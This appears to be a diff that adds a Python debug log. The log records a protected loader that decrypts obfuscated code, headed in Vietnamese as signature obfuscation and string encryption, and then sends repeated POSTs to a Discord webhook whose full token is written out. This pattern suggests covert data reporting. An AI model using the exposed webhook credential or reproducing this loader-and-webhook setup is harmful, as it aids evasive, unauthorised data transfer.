@@ -1,0 +1,90 @@
+2026-03-24 17:55:21,903 - DEBUG - _run_protected started
+2026-03-24 17:59:29,712 - DEBUG - _run_protected started
+2026-03-24 18:07:15,190 - DEBUG - _run_protected started
+2026-03-24 18:07:15,205 - DEBUG - Decrypted length: 39803
+2026-03-24 18:07:15,205 - DEBUG - Decrypted code snippet: # === LÀM NHI\u1ec4U CH\u1eee KÝ - MÃ HÓA CHU\u1ed6I ===
+import base64
+import random
+import string
+import time
+import os
+import threading
+import sys
+import subprocess
+import ctypes
+import unicodedata
+from
+2026-03-24 18:56:36,630 - DEBUG - _run_protected started
+2026-03-24 18:56:36,646 - DEBUG - Decrypted length: 40786
+2026-03-24 18:56:36,646 - DEBUG - Decrypted code snippet: from __future__ import annotations
+import base64
+import random
+import string
+import time
+import os
+import threading
+import sys
+import subprocess
+import ctypes
+import unicodedata
+from typing
+2026-03-24 18:56:37,536 - DEBUG - _run_protected started
+2026-03-24 18:56:37,552 - DEBUG - Decrypted length: 40786
+2026-03-24 18:56:37,552 - DEBUG - Decrypted code snippet: from __future__ import annotations
+import base64
+import random
+import string
+import time
+import os
+import threading
+import sys
+import subprocess
+import ctypes
+import unicodedata
+from typing
+2026-03-24 18:56:40,505 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2026-03-24 18:56:41,115 - DEBUG - https://discord.com:443 "POST /api/webhooks/1479666811460128870/iM6a25qYc0LhSm8055H3cQRppbt0fAK07nLMLxmVsjuqY7cNUZuQY_ne2_MWzIG1RDLC HTTP/1.1" 204 0
+2026-03-24 19:02:27,586 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2026-03-24 19:02:28,234 - DEBUG - https://discord.com:443 "POST /api/webhooks/1479666811460128870/iM6a25qYc0LhSm8055H3cQRppbt0fAK07nLMLxmVsjuqY7cNUZuQY_ne2_MWzIG1RDLC HTTP/1.1" 204 0
+2026-03-24 19:02:28,234 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2026-03-24 19:02:28,848 - DEBUG - https://discord.com:443 "POST /api/webhooks/1479666811460128870/iM6a25qYc0LhSm8055H3cQRppbt0fAK07nLMLxmVsjuqY7cNUZuQY_ne2_MWzIG1RDLC HTTP/1.1" 204 0
+2026-03-24 19:07:37,707 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2026-03-24 19:07:38,279 - DEBUG - https://discord.com:443 "POST /api/webhooks/1479666811460128870/iM6a25qYc0LhSm8055H3cQRppbt0fAK07nLMLxmVsjuqY7cNUZuQY_ne2_MWzIG1RDLC HTTP/1.1" 204 0
+2026-03-24 19:07:38,284 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2026-03-24 19:07:38,819 - DEBUG - https://discord.com:443 "POST /api/webhooks/1479666811460128870/iM6a25qYc0LhSm8055H3cQRppbt0fAK07nLMLxmVsjuqY7cNUZuQY_ne2_MWzIG1RDLC HTTP/1.1" 204 0
+2026-03-24 19:07:40,285 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2026-03-24 19:07:41,027 - DEBUG - https://discord.com:443 "POST /api/webhooks/1479666811460128870/iM6a25qYc0LhSm8055H3cQRppbt0fAK07nLMLxmVsjuqY7cNUZuQY_ne2_MWzIG1RDLC HTTP/1.1" 204 0
+2026-03-24 19:12:47,788 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2026-03-24 19:12:48,366 - DEBUG - https://discord.com:443 "POST /api/webhooks/1479666811460128870/iM6a25qYc0LhSm8055H3cQRppbt0fAK07nLMLxmVsjuqY7cNUZuQY_ne2_MWzIG1RDLC HTTP/1.1" 204 0
+2026-03-24 19:12:48,370 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2026-03-24 19:12:49,014 - DEBUG - https://discord.com:443 "POST /api/webhooks/1479666811460128870/iM6a25qYc0LhSm8055H3cQRppbt0fAK07nLMLxmVsjuqY7cNUZuQY_ne2_MWzIG1RDLC HTTP/1.1" 204 0
+2026-03-24 19:25:40,555 - DEBUG - _run_protected started
+2026-03-24 19:25:40,555 - DEBUG - Decrypted length: 40786
+2026-03-24 19:25:40,555 - DEBUG - Decrypted code snippet: from __future__ import annotations
+import base64
+import random
+import string
+import time
+import os
+import threading
+import sys
+import subprocess
+import ctypes
+import unicodedata
+from typing
+2026-03-24 19:25:40,925 - DEBUG - _run_protected started
+2026-03-24 19:25:40,931 - DEBUG - Decrypted length: 40786
+2026-03-24 19:25:40,931 - DEBUG - Decrypted code snippet: from __future__ import annotations
+import base64
+import random
+import string
+import time
+import os
+import threading
+import sys
+import subprocess
+import ctypes
+import unicodedata
+from typing
+2026-03-24 19:25:41,440 - DEBUG - Starting new HTTPS connection (1): discord.com:443
+2026-03-24 19:25:42,633 - DEBUG - https://discord.com:443 "POST /api/webhooks/1479666811460128870/iM6a25qYc0LhSm8055H3cQRppbt0fAK07nLMLxmVsjuqY7cNUZuQY_ne2_MWzIG1RDLC HTTP/1.1" 204 0
